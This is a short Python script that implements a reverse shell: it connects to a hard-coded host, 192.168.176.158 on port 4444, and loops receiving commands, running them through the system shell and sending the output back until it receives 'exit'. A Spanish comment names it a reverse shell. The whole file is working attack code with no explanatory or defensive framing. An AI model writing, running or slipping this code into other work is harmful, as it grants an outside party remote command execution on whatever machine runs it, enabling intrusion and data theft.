import socket
import subprocess

def run():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.176.158", 4444))

    while True:
        command = s.recv(1024).decode()
        if command == "exit":
            break
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode()
        s.send(output.encode())

    # Cierra la conexión de reverse shell
    s.close()
